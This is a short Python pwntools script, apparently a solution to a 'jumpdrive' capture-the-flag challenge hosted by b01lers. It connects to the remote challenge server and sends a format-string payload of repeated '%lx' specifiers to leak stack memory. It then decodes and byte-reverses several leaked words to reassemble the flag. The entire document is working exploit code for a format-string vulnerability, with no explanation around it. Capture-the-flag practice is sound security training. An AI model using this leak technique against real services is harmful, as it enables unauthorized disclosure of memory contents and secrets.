from pwn import *


#p = process("./jumpdrive")
p = remote("pwn.ctf.b01lers.com", 1002)
p.recvline()
p.recvline()
p.recvline()

payload = "%lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx "
p.sendline(payload)
a = p.recvall().split(" ")
flag = a[9].decode("hex")[::-1] + a[10].decode("hex")[::-1]
flag = flag + a[11].decode("hex")[::-1] + a[12].decode("hex").strip(" ")[::-1]
print(flag)
